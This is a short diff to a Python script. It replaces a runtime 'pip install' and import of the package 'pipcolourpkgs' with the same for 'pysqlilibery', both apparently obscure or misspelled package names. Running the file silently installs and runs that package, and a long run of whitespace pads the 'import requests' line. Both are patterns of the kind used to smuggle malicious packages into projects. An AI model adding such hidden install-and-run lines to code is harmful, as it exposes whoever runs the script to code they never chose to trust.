@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcolourpkgs")
-import pipcolourpkgs
+os.system("pip install pysqlilibery")
+import pysqlilibery
 import requests																																																																																																																																																																																																																																																																					
 import undetected_chromedriver as uc
 uc.install()
